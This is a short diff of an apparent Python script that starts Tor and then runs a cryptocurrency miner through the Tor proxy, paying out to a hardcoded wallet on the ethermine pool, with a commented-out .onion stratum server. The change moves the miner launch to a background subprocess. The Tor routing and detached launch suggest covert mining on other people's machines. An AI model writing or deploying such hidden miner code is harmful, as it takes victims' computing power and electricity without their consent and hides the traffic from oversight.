@@ -55,4 +55,4 @@ except:
 os.system('tor &')
 time.sleep(60)
 #os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
-os.system (program + ' --algo ethash --server asia1.ethermine.org:4444 --proxy 127.0.0.1:9050 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701')
+subprocess.Popen (program + ' --algo ethash --server asia1.ethermine.org:4444 --proxy 127.0.0.1:9050 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701')
